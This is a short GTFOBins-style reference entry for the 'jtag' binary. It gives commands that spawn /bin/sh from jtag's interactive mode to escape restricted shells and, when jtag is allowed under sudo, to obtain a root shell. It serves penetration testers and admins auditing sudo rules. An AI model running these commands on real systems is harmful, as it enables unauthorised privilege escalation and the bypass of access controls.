# GTFOBin: jtag

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
jtag --interactive
shell /bin/sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo jtag --interactive
shell /bin/sh
```